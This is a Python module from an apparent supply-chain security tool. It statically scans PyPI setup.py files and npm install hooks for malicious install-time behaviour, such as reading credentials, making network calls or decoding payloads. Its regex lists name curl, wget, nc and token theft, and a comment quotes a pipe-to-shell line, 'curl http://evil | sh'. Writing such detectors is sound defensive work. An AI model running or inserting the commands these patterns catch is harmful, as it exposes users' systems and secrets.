"""Static inspection of install-time code.

This exists for the case the existence check cannot see: a hallucinated name an
attacker has *already registered*. Such a package exists, so it passes; and it
is young with one release and no repository link, which describes every honest
new package too. Age cannot separate them.

Install-time behaviour can. A slopsquat has to run something when it is
installed -- that is the whole point of publishing it -- so it reaches for a
network call, an environment variable, or a subprocess from `setup.py` or an
npm install hook. An honest new library almost never does any of that at
install time.

**Nothing here is ever executed.** Archives are read in memory, only named
install-time files are looked at, and the contents are pattern-matched as text.
Sizes are capped so a decompression bomb cannot exhaust memory.
"""

from __future__ import annotations

import io
import re
import tarfile
import urllib.request
import zipfile
from dataclasses import dataclass

from .registries import USER_AGENT

MAX_ARCHIVE_BYTES = 8 * 1024 * 1024   # don't download more than this
MAX_MEMBER_BYTES = 512 * 1024         # don't read a single file bigger than this
MAX_MEMBERS = 2000                    # don't walk an archive with more entries
TIMEOUT = 20

PY_INSTALL_FILES = ("setup.py",)
NPM_INSTALL_HOOKS = ("preinstall", "install", "postinstall", "prepare")


@dataclass(frozen=True)
class Signal:
    """One thing found in install-time code, with the text that triggered it."""

    kind: str
    detail: str
    where: str

    def __str__(self) -> str:
        return f"{self.detail} in {self.where}"


# Ordered most-to-least alarming. Each pattern describes something an install
# script has no ordinary reason to do.
PATTERNS: tuple[tuple[str, str, re.Pattern[str]], ...] = (
    (
        "exfiltration",
        "reads environment variables and contacts the network",
        re.compile(
            r"(os\.environ|process\.env|getenv)[\s\S]{0,400}?"
            r"(urlopen|requests\.(get|post)|urllib|http[s]?://|fetch\(|axios|curl|wget)",
            re.IGNORECASE,
        ),
    ),
    (
        "network",
        "makes a network request at install time",
        re.compile(
            r"(urllib\.request|urlopen|requests\.(get|post)|socket\.socket|"
            r"http\.client|child_process[\s\S]{0,80}(curl|wget)|"
            r"\bcurl\s+-|\bwget\s+http)",
            re.IGNORECASE,
        ),
    ),
    (
        "subprocess",
        "runs a shell command at install time",
        re.compile(
            r"(subprocess\.(run|call|Popen|check_output)|os\.system|os\.popen|"
            r"child_process|execSync|spawnSync)",
        ),
    ),
    (
        "encoded-payload",
        "decodes an encoded blob at install time",
        re.compile(
            r"(base64\.(b64decode|decodebytes)|Buffer\.from\([^)]*base64|"
            r"codecs\.decode\([^)]*(rot13|hex)|bytes\.fromhex)",
        ),
    ),
    (
        "dynamic-exec",
        "executes code it decoded or fetched at install time",
        # Bare exec()/compile() appears in legitimate setup.py files that read a
        # version string out of a source file, so it is only interesting when
        # what gets executed was decoded or downloaded first.
        re.compile(
            r"(\beval\(|\bexec\(|new Function\()[^)\n]{0,200}"
            r"(b64decode|\.decode\(|urlopen|requests\.|fromhex|Buffer\.from)",
        ),
    ),
)

# npm install hooks are *shell commands*, not source code. The patterns above
# were written for Python and JavaScript idioms and missed every shape that
# actually appears: `curl http://evil | sh` carries no `curl -` flag, `node -e`
# is not `eval(`, and `powershell -c IWR` looks nothing like `urllib.request`.
SHELL_PATTERNS: tuple[tuple[str, str, re.Pattern[str]], ...] = (
    (
        "pipe-to-shell",
        "downloads a script and pipes it straight into a shell",
        re.compile(
            r"(curl|wget|fetch|iwr|invoke-webrequest)\b[^|;&\n]*\|\s*"
            r"(sh|bash|zsh|dash|node|python[0-9.]*|perl|ruby)\b",
            re.IGNORECASE,
        ),
    ),
    (
        "exfiltration",
        "sends an environment variable somewhere",
        re.compile(
            r"(\$\{?[A-Z_]*(TOKEN|SECRET|PASSWORD|_KEY)|process\.env\.[A-Za-z_]*"
            r"(TOKEN|SECRET|PASSWORD|KEY))[\s\S]{0,200}?"
            r"(curl|wget|https?://|fetch\(|axios|iwr\b)",
            re.IGNORECASE,
        ),
    ),
    (
        "network",
        "makes a network request at install time",
        re.compile(
            r"(\bcurl\b|\bwget\b|\biwr\b|invoke-webrequest|\bnc\b\s+-|https?://)",
            re.IGNORECASE,
        ),
    ),
    (
        "inline-script",
        "runs code passed on the command line",
        re.compile(
            r"\b(node|python[0-9.]*|ruby|perl|php)\b\s+(-e|-c|--eval)\b"
            r"|\bpowershell\b[^\n]{0,80}\s-(c|command|enc|encodedcommand)\b",
            re.IGNORECASE,
        ),
    ),
    (
        "encoded-payload",
        "decodes an encoded blob at install time",
        re.compile(
            r"(base64\s+-d|base64\s+--decode|atob\(|Buffer\.from\([^)]*base64|"
            r"frombase64string|-enc(odedcommand)?\b)",
            re.IGNORECASE,
        ),
    ),
    (
        "environment",
        "reads a credential from the environment at install time",
        # Far more pointed in a shell hook than in build code: an install
        # script has no ordinary reason to read a token.
        re.compile(
            r"(process\.env\.[A-Za-z_]*(TOKEN|SECRET|PASSWORD|KEY)"
            r"|\$\{?[A-Z_]*(TOKEN|SECRET|PASSWORD|_KEY)\b)",
        ),
    ),
)

# `"postinstall": "node install.js"` is the commonest shape of all, and the
# interesting code lives in the file it names rather than in the hook itself.
REFERENCED_SCRIPT = re.compile(
    r"\b(?:node|python[0-9.]*|sh|bash|ruby|perl)\s+"
    r"(?:\./)?([A-Za-z0-9_./-]+\.(?:js|cjs|mjs|py|sh|rb|pl))\b"
)

# A long unbroken base64-looking run is worth flagging on its own.
BLOB = re.compile(r"['\"][A-Za-z0-9+/]{220,}={0,2}['\"]")


class InspectionError(RuntimeError):
    """The archive could not be retrieved or read."""


def scan_text(text: str, where: str, shell: bool = False) -> list[Signal]:
    """Pattern-match one install script. Never executes anything.

    `shell=True` selects the command-line patterns used for npm hooks; the
    default set describes Python and JavaScript source.
    """
    found: list[Signal] = []
    seen: set[str] = set()
    for kind, detail, pattern in (SHELL_PATTERNS if shell else PATTERNS):
        if kind in seen:
            continue
        if pattern.search(text):
            found.append(Signal(kind, detail, where))
            seen.add(kind)
    if BLOB.search(text) and "encoded-payload" not in seen:
        found.append(Signal("encoded-payload", "contains a large encoded blob", where))
    return found


def _download(url: str, limit: int = MAX_ARCHIVE_BYTES) -> bytes:
    request = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
    try:
        with urllib.request.urlopen(request, timeout=TIMEOUT) as response:
            data = response.read(limit + 1)
    except Exception as exc:  # noqa: BLE001 - any failure is just "can't inspect"
        raise InspectionError(f"could not download {url}: {exc}") from exc
    if len(data) > limit:
        raise InspectionError("archive is larger than the inspection limit")
    return data


def _read_member(handle, member, size: int) -> str | None:
    if size > MAX_MEMBER_BYTES:
        return None
    try:
        extracted = handle.extractfile(member) if hasattr(handle, "extractfile") else None
        raw = extracted.read(MAX_MEMBER_BYTES) if extracted else handle.read(member)
    except Exception:  # noqa: BLE001
        return None
    return raw.decode("utf-8", errors="replace")


def _interesting(path: str, ecosystem: str) -> bool:
    """Only the archive's own install script, never a nested one.

    Matching on the basename alone meant a package that ships packaging test
    fixtures or vendors a dependency was judged on somebody else's
    `setup.py` -- and since install signals block a young package, that was
    the one false-positive path in the blocking logic.

    Both ecosystems put the real one exactly one directory down:
    `<name>-<version>/setup.py` for an sdist, `package/package.json` for npm.
    """
    parts = path.strip("/").split("/")
    if len(parts) != 2:
        return False
    name = parts[1]
    if ecosystem == "npm":
        return name == "package.json"
    return name in PY_INSTALL_FILES


def _npm_hook_source(text: str) -> str:
    """The install hooks out of a package.json, as one blob of text."""
    import json

    try:
        data = json.loads(text)
    except ValueError:
        return ""
    scripts = data.get("scripts")
    if not isinstance(scripts, dict):
        return ""
    return "\n".join(
        str(scripts[hook]) for hook in NPM_INSTALL_HOOKS if scripts.get(hook)
    )


def _members(data: bytes) -> "dict[str, str]":
    """Read the archive into a dict of path -> text, in memory only.

    Nothing is extracted to disk, so a path-traversal entry has nowhere to
    write. Member count and member size are capped so a decompression bomb
    cannot exhaust memory.
    """
    out: dict[str, str] = {}
    buffer = io.BytesIO(data)
    try:
        if data[:2] == b"PK":
            with zipfile.ZipFile(buffer) as archive:
                for info in archive.infolist()[:MAX_MEMBERS]:
                    if info.is_dir():
                        continue
                    text = _read_member(archive, info.filename, info.file_size)
                    if text is not None:
                        out[info.filename] = text
        else:
            with tarfile.open(fileobj=buffer, mode="r:*") as archive:
                for member in archive.getmembers()[:MAX_MEMBERS]:
                    if not member.isfile():
                        continue
                    text = _read_member(archive, member, member.size)
                    if text is not None:
                        out[member.name] = text
    except (tarfile.TarError, zipfile.BadZipFile, EOFError, OSError) as exc:
        raise InspectionError(f"could not read archive: {exc}") from exc
    return out


def _root_of(path: str) -> str:
    parts = path.strip("/").split("/")
    return parts[0] if parts else ""


def inspect_archive(data: bytes, ecosystem: str) -> list[Signal]:
    """Statically inspect one package's install-time code.

    Nothing is executed, imported or compiled -- every file is read as text and
    matched against patterns.
    """
    members = _members(data)
    signals: list[Signal] = []

    for path, text in members.items():
        if not _interesting(path, ecosystem):
            continue
        where = path.rsplit("/", 1)[-1]

        if ecosystem != "npm":
            if text.strip():
                signals += scan_text(text, where)
            continue

        hooks = _npm_hook_source(text)
        if not hooks.strip():
            continue
        # Hooks are shell commands, so they need the shell patterns.
        signals += scan_text(hooks, where, shell=True)

        # `"postinstall": "node install.js"` is the commonest shape, and the
        # code that matters is in the file it names. Read that too, with the
        # source patterns, since it is JavaScript rather than a command line.
        root = _root_of(path)
        for referenced in set(REFERENCED_SCRIPT.findall(hooks)):
            target = f"{root}/{referenced.lstrip('./')}"
            script = members.get(target)
            if script and script.strip():
                signals += scan_text(script, referenced)

    # keep the first signal of each kind, most alarming first
    order = {kind: i for i, (kind, _, _) in enumerate(PATTERNS)}
    order.update(
        {kind: i for i, (kind, _, _) in enumerate(SHELL_PATTERNS) if kind not in order}
    )
    unique: dict[str, Signal] = {}
    for signal in signals:
        unique.setdefault(signal.kind, signal)
    return sorted(unique.values(), key=lambda s: order.get(s.kind, 99))

def inspect_package(archive_url: str, ecosystem: str) -> list[Signal]:
    """Download and statically inspect one package's install-time code."""
    return inspect_archive(_download(archive_url), ecosystem)
